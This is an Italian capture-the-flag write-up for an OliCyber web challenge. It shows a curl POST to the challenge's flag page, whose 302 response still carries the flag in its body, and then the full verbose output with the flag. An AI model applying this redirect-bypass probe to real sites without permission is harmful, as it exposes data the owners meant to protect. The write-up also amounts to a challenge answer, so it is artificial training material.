> Sotto gli occhi

Non appena si prova a inserire una password nel form disponibile all'URL, rimanda a /roll.html (che è un RickRoll ovviamente), e non termina l'esecuzione del codice php; questo significa (e si può vedere dal Network) che la flag viene stampata al momento della richiesta ed è visibile se si impedisce il redirect automatico.

Richiediamo la pagina nel modo che preferiamo, con curl il comando da eseguire è `curl -v -X POST -d password=1234 http://was-it-a-flag.challs.olicyber.it/flag.php`:

```html
* Host was-it-a-flag.challs.olicyber.it:80 was resolved.
* IPv6: (none)
* IPv4: 5.75.221.48
*   Trying 5.75.221.48:80...
* Connected to was-it-a-flag.challs.olicyber.it (5.75.221.48) port 80
> POST /flag.php HTTP/1.1
> Host: was-it-a-flag.challs.olicyber.it
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 13
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 302 Found
< Content-Type: text/html; charset=UTF-8
< Date: Sat, 13 Sep 2025 20:54:47 GMT
< Location: roll.html
< Server: nginx
< Transfer-Encoding: chunked

    <!DOCTYPE html>
    <html>
        flag{go_visit->http://cioe.deallora.de}    
    </html>

* Connection #0 to host was-it-a-flag.challs.olicyber.it left intact
```